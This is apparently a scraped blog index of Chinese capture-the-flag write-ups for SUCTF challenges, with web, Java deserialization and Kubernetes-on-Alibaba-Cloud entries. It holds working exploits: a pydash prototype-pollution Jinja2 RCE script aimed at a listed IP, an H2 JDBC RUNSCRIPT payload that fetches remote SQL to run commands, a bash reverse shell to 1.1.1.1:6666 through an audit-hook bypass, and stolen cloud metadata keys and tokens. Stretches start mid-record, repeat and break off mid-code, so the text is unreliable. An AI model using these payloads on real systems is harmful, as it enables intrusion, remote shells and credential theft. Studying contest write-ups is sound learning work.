\u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, 